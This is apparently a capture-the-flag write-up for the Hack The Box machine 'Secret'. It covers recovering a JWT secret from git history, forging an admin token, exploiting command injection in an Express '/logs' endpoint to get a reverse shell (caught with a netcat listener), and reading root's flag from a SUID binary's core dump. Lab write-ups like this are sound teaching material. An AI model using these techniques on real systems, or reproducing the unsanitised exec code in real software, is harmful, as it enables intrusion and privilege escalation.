## Default Information
IP Address: 10.10.11.120\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.11.120    secret.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.11.120 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-11-04 07:01:01 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.11.120                                    
Discovered open port 80/tcp on 10.10.11.120                                    
Discovered open port 3000/tcp on 10.10.11.120    
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port. From the output, we can easily see that 
this machine uses Express middleware which signifies that the backend of this machine is Node JS.

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | Open |
| 80	| HTTP | nginx 1.18.0 (Ubuntu) | Open |
| 3000	| HTTP | Node.js (Express middleware) | Open |

Afterwwards, we will use Nmap to scan for potential vulnerabilties on each of the ports

```
{Nmap output}
```

### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://secret.htb on port 80. At the same time, we also realize that endpoints on port 3000 
is the same as port 80.

```
http://10.10.11.120/api/experiments.php  (Status: 200) [Size: 93]
http://10.10.11.120/api/experiments.asp  (Status: 200) [Size: 93]
http://10.10.11.120/api/experiments/configurations.txt (Status: 200) [Size: 93]
http://10.10.11.120/api                  (Status: 200) [Size: 93]
http://10.10.11.120/api/experiments.aspx (Status: 200) [Size: 93]
http://10.10.11.120/api/experiments/configurations (Status: 200) [Size: 93]
http://10.10.11.120/api/experiments.jsp  (Status: 200) [Size: 93]
http://10.10.11.120/api/experiments/configurations.html (Status: 200) [Size: 93]
http://10.10.11.120/api/experiments      (Status: 200) [Size: 93]
http://10.10.11.120/api/experiments/configurations.php (Status: 200) [Size: 93]
http://10.10.11.120/api/experiments.txt  (Status: 200) [Size: 93]
http://10.10.11.120/api/experiments/configurations.asp (Status: 200) [Size: 93]
http://10.10.11.120/api/experiments.html (Status: 200) [Size: 93]
http://10.10.11.120/api/experiments/configurations.aspx (Status: 200) [Size: 93]
http://10.10.11.120/api/experiments/configurations.jsp (Status: 200) [Size: 93]
http://10.10.11.120/assets               (Status: 301) [Size: 179] [--> /assets/]
http://10.10.11.120/download             (Status: 301) [Size: 183] [--> /download/]
http://10.10.11.120/docs                 (Status: 200) [Size: 20720]
```

### Web-content discovery

From the main page of http://secret,htb, we can find http://secret.htb/download/files.zip that allows us to download files.zip folder. Unzipping the folder 
gives us a local-web directory which contains a .git folder that tells us that this folder is most likely a zip file downloaded from a git repo.

```
┌──(kali㉿kali)-[~/Desktop/local-web]
└─$ ls -la        
total 116
drwxrwxr-x   8 kali kali  4096 Sep  3 01:57 .
drwxr-xr-x   8 kali kali  4096 Nov  4 03:10 ..
-rw-rw-r--   1 kali kali    72 Sep  3 01:59 .env
drwxrwxr-x   8 kali kali  4096 Sep  8 14:33 .git
-rw-rw-r--   1 kali kali   885 Sep  3 01:56 index.js
drwxrwxr-x   2 kali kali  4096 Aug 13 00:42 model
drwxrwxr-x 201 kali kali  4096 Aug 13 00:42 node_modules
-rw-rw-r--   1 kali kali   491 Aug 13 00:42 package.json
-rw-rw-r--   1 kali kali 69452 Aug 13 00:42 package-lock.json
drwxrwxr-x   4 kali kali  4096 Sep  3 01:54 public
drwxrwxr-x   2 kali kali  4096 Sep  3 02:32 routes
drwxrwxr-x   4 kali kali  4096 Aug 13 00:42 src
-rw-rw-r--   1 kali kali   651 Aug 13 00:42 validations.js
```

Visiting http://secret.htb/docs, we are presented with a documentation on how to register a user and login to the user. Let us try to register a new user and login to the new 
user. Let's start by registering a new user.

![Registering user](https://github.com/joelczk/writeups/blob/main/HTB/Images/Secret/register.png)

Afterwards, we will login with the new user to obtain the JWT token.

![Logging iin with new user](https://github.com/joelczk/writeups/blob/main/HTB/Images/Secret/login.png)

However, we realize that the user that we have registered is only a normal user, but not an admin user.

![Normal user](https://github.com/joelczk/writeups/blob/main/HTB/Images/Secret/normal_user.png)

### Analysis of git folder

Looking at /routes/private.js folder, we are able to find that if the name of the user is ```theadmin```, the user will be an admin user and will be able to access the /api/private endpoint. However, the user must be able to produce a valid token.

```
router.get('/priv', verifytoken, (req, res) => {
   // res.send(req.user)

    const userinfo = { name: req.user }

    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        res.json({
            creds:{
                role:"admin", 
                username:"theadmin",
                desc : "welcome back admin,"
            }
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})
```

Next, we will look at routes/verifytoken.js to find out how to obtain a valid JWT token. From the code, we know that we will need to find out the secret token from the .env file to tamper the token

```
module.exports = function (req, res, next) {
    const token = req.header("auth-token");
    if (!token) return res.status(401).send("Access Denied");

    try {
        const verified = jwt.verify(token, process.env.TOKEN_SECRET);
        req.user = verified;
        next();
    } catch (err) {
        res.status(400).send("Invalid Token");
    }
};
```

However, the secret token in the .env file has been removed and we are unable to recover it.

```
┌──(kali㉿kali)-[~/Desktop/local-web]
└─$ cat .env      
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
```

### Obtaining secret token

Knowing that this folder belongs to a git repository, we will sieve through the logs to find for any previous commits that contained the secret token. From git logs, we can see 
that the secret token might potentially have been removed in commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78. 
```
┌──(kali㉿kali)-[~/Desktop/local-web]
└─$ git log
commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -> master)
Author: dasithsv <dasithsv@gmail.com>
Date:   Thu Sep 9 00:03:27 2021 +0530

    now we can view logs from server 😃

commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons
```

Viewing that commit, we will be able to obtain the secret token that is used.
```
┌──(kali㉿kali)-[~/Desktop/local-web]
└─$ git show 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78                              148 ⨯ 1 ⚙
commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret

```
## Exploit
### Tampering JWT token

Using the previous JWT token on https://jwt.io/, we will modify the payload such that the ```name``` parameter becomes ```theadmin```.

```
{
  "_id": "6183949a23b96d045e41d9da",
  "name": "theadmin",
  "email": "test@xyz.com",
  "iat": 1636013890
}
```

With the new jwt token, we are able to obtain admin access to /api/priv.

![admin access](https://github.com/joelczk/writeups/blob/main/HTB/Images/Secret/admin_access.png)

### Command Injection on /logs endpoint

From /routes/private.js, we can see that once we get authenticated with admin privileges, we are able to gain access to the /logs endpoint.

```
router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})

router.use(function (req, res, next) {
    res.json({
        message: {

            message: "404 page not found",
            desc: "page you are looking for is not found. "
        }
    })
});
```

We also notice that ```git log --oneline ${file}``` will be executed, and there is no filtering of ```file``` input to prevent command injection attack. Let's try to do a command injection attack using ```id``` command. From the output, we can see that the command injection attack has been successful. 

![Command Injection](https://github.com/joelczk/writeups/blob/main/HTB/Images/Secret/command_injection.png)
### Obtaining reverse shell

Next, we will just use the reverse shell payload on the file parameter in the endpoint. (Remember to url encode the payload)

![Reverse shell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Secret/rev_shell.png)

### Obtaining user flag

```
┌──(kali㉿kali)-[~/Desktop/local-web]
└─$ nc -nlvp 3000                                                                        1 ⚙
listening on [any] 3000 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.120] 52820
bash: cannot set terminal process group (1118): Inappropriate ioctl for device
bash: no job control in this shell
dasith@secret:~/local-web$ cat /home/dasith/user.txt
cat /home/dasith/user.txt
<Redacted user flag>
dasith@secret:~/local-web$ 
```
### Exploiting SUID

Running LinEnum, we are able to find a SUID file /opt/count. Navigating to the /opt directory, we discover a code.c file. In the code.c file, we are able to find that coredump generation has been enabled

```
// drop privs to limit file write
setuid(getuid());
// Enable coredump generation
prctl(PR_SET_DUMPABLE, 1);
printf("Save results a file? [y/N]: ");
res = getchar();
```

Now, what we can do is to crash the program while it is executing so that the memory will be dumped to the /var/crash folder. We can then extract the folder to obtain the root flag. To start with, let's execute the count binary.

```
dasith@secret:/opt$ ./count
./count
Enter source file/directory name: /root/root.txt
/root/root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
```

Afterwards, let's open another shell and crash the process executing the count binary

```
dasith@secret:/var/crash$ ps -aux | grep "count"
ps -aux | grep "count"
root         836  0.0  0.1 235676  7472 ?        Ssl  06:38   0:00 /usr/lib/accountsservice/accounts-daemon
dasith      2876  0.0  0.0   2488   524 pts/1    S+   10:28   0:00 ./count
dasith      2878  0.0  0.0   6432   672 pts/2    S+   10:29   0:00 grep --color=auto count
dasith@secret:/var/crash$ kill -BUS 2876
kill -BUS 2876
```

Lastly, let's save the coredump file from the memory dumped in /var/crash directory.

```
dasith@secret:/var/crash$ ls -la
ls -la
total 88
drwxrwxrwt  2 root   root    4096 Nov  4 10:29 .
drwxr-xr-x 14 root   root    4096 Aug 13 05:12 ..
-rw-r-----  1 root   root   27203 Oct  6 18:01 _opt_count.0.crash
-rw-r-----  1 dasith dasith 28068 Nov  4 10:29 _opt_count.1000.crash
-rw-r-----  1 root   root   24048 Oct  5 14:24 _opt_countzz.0.crash
dasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /home/dasith/dump
apport-unpack _opt_count.1000.crash /home/dasith/dump
```

### Obtaining root flag
dasith@secret:/var/crash$ cd /home/dasith/dump
cd /home/dasith/dump
dasith@secret:~/dump$ strings CoreDump
...
Enter source file/directory name: 
%99s
Save results a file? [y/N]: 
Path: 
Could not open %s for writing
:*3$"
Save results a file? [y/N]: words      = 2
Total lines      = 2
/root/root.txt
<Redacted root flag>
aliases
ethers
group
gshadow
hosts
initgroups
```
